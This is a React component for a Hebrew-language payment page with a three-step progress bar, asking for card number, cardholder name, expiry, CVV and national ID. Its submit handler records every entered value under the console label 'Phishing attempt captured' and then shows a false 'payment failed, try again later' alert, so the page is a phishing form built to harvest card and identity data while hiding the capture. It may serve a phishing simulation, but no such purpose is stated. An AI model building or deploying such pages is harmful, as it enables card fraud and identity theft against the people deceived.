
import React, { useState } from 'react';

const Step: React.FC<{ icon: React.ReactNode; label: string; isActive?: boolean; isCompleted?: boolean }> = ({ icon, label, isActive, isCompleted }) => {
    const activeClasses = 'text-red-600 border-red-600';
    const completedClasses = 'text-gray-500 border-gray-300';
    const defaultClasses = 'text-gray-400 border-gray-300';

    let stateClasses = defaultClasses;
    if (isActive) stateClasses = activeClasses;
    if (isCompleted) stateClasses = completedClasses;

    return (
        <div className={`flex flex-col items-center justify-center p-4 border-b-4 ${stateClasses}`}>
            <div className="text-3xl mb-2">{icon}</div>
            <span className="text-sm font-semibold">{label}</span>
        </div>
    );
};

const BarcodeIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 4v16m-4-10h14M9 4H6a2 2 0 00-2 2v12a2 2 0 002 2h3m12-16h-3a2 2 0 00-2 2v12a2 2 0 002 2h3a2 2 0 002-2V6a2 2 0 00-2-2z" />
    </svg>
);

const CreditCardIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
    </svg>
);

const SummaryIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
    </svg>
);


const ProgressBar = () => {
    return (
        <div className="grid grid-cols-3 text-center border-b border-gray-200">
            <Step icon={<BarcodeIcon />} label="בדיקת ברקוד" isCompleted />
            <Step icon={<CreditCardIcon />} label="תשלום" isActive />
            <Step icon={<SummaryIcon />} label="סיכום" />
        </div>
    );
};

const PaymentForm: React.FC = () => {
    const [cardNumber, setCardNumber] = useState('');
    const [cardName, setCardName] = useState('');
    const [expiryMonth, setExpiryMonth] = useState('');
    const [expiryYear, setExpiryYear] = useState('');
    const [cvv, setCvv] = useState('');
    const [idNumber, setIdNumber] = useState('');

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        console.log("Phishing attempt captured:");
        console.log({
            cardNumber,
            cardName,
            expiry: `${expiryMonth}/${expiryYear}`,
            cvv,
            idNumber
        });
        alert("התשלום נכשל, אנא נסה שנית מאוחר יותר.");
    };

    return (
        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
            <ProgressBar />
            <div className="p-8">
                <div className="flex justify-between items-center mb-6">
                    <h2 className="text-xl font-bold">פרטי תשלום</h2>
                    <button className="flex items-center text-sm text-gray-500 hover:text-red-600">
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h5M20 20v-5h-5" />
                        </svg>
                        איפוס
                    </button>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <label htmlFor="cardName" className="block text-sm font-medium text-gray-700 mb-1">שם בעל הכרטיס</label>
                        <input type="text" id="cardName" value={cardName} onChange={(e) => setCardName(e.target.value)} className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500" required />
                    </div>
                    <div>
                        <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">מספר כרטיס <span className="text-red-500">*</span></label>
                        <input type="text" id="cardNumber" inputMode="numeric" pattern="[0-9\s]{13,19}" autoComplete="cc-number" maxLength={19} placeholder="xxxx xxxx xxxx xxxx" value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500" required />
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">תוקף <span className="text-red-500">*</span></label>
                            <div className="flex items-center space-x-2">
                                <input type="text" value={expiryMonth} onChange={(e) => setExpiryMonth(e.target.value)} placeholder="MM" maxLength={2} className="w-1/2 text-center px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500" required />
                                <span className="text-gray-500">/</span>
                                <input type="text" value={expiryYear} onChange={(e) => setExpiryYear(e.target.value)} placeholder="YY" maxLength={2} className="w-1/2 text-center px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500" required />
                            </div>
                        </div>
                        <div>
                            <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-1">CVV <span className="text-red-500">*</span></label>
                            <input type="text" id="cvv" maxLength={3} value={cvv} onChange={(e) => setCvv(e.target.value)} className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500" required />
                        </div>
                        <div>
                            <label htmlFor="idNumber" className="block text-sm font-medium text-gray-700 mb-1">תעודת זהות</label>
                            <input type="text" id="idNumber" maxLength={9} value={idNumber} onChange={(e) => setIdNumber(e.target.value)} className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500" />
                        </div>
                    </div>
                    <div className="pt-4">
                         <button type="submit" className="w-full bg-red-600 text-white py-3 px-4 border border-transparent rounded-full shadow-sm text-lg font-semibold hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition-colors">
                            בצע תשלום
                        </button>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default PaymentForm;
